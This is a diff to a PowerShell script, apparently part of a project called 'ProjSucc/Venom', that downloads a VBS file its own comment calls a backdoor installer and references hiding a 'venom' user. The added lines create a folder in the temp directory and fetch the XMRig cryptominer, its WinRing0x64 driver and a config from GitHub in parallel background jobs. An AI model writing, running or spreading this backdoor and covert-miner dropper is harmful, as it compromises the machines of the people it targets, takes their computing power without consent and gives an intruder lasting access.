@@ -23,6 +23,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 ## variables
 $wd = random_text
 $path = "$env:temp/$wd"
+$path_1 = $env:temp/$wd/rig
 $initial_dir = Get-Location
 
 
@@ -61,11 +62,67 @@ Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master
 #visual bsic script to install backdoor
 Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/calty2.vbs -OutFile "calty2.vbs"
 
-powershell powershell.exe -windowstyle hidden -ep bypass ./attempt1.exe
+#powershell powershell.exe -windowstyle hidden -ep bypass ./attempt1.exe
 
-.\attempt1.exe; ./calty2
+mkdir $path_1
+cd $path_1
+
+
+
+$baseUri = 'https://github.com/P0k3m0n-unleashed/ProjSucc/tree/master/Venom/xmrig-6.22.2'
+$files = @(
+    @{
+        Uri = "$baseUri/SHA256SUMS"
+        OutFile = 'SHA256SUMS.txt'
+    },
+    @{
+        Uri = "$baseUri/WinRing0x64.sys"
+        OutFile = 'WinRing0x64.sys'
+    },
+    @{
+        Uri = "$baseUri/benchmark_10M.cmd"
+        OutFile = 'benchmark_10M.cmd'
+    },
+    @{
+        Uri = "$baseUri/benchmark_1M.cmd"
+        OutFile = 'benchmark_1M.cmd'
+    },
+    @{
+        Uri = "$baseUri/config.json"
+        OutFile = 'config.json'
+    },
+    @{
+        Uri = "$baseUri/start.cmd"
+        OutFile = 'start.cmd'
+    },
+    @{
+        Uri = "$baseUri/xmrig.exe"
+        OutFile = 'xmrig.exe'
+    } 
+)
+
+$jobs = @()
+
+foreach ($file in $files) {
+    $jobs += Start-ThreadJob -Name $file.OutFile -ScriptBlock {
+        $params = $using:file
+        Invoke-WebRequest @params
+    }
+}
+
+Write-Host "Downloads started..."
+Wait-Job -Job $jobs
+
+foreach ($job in $jobs) {
+    Receive-Job -Job $job
+}
+
+
+
+
+#.\attempt1.exe; ./calty2
     # Install the attempt1.exe file
-powershell Start-Process -FilePath $path ./attempt1.exe -ArgumentList "/silent" -Wait
+#powershell Start-Process -FilePath $path .\attempt1.exe -ArgumentList "/silent" -Wait
 
 # hide venom user
 
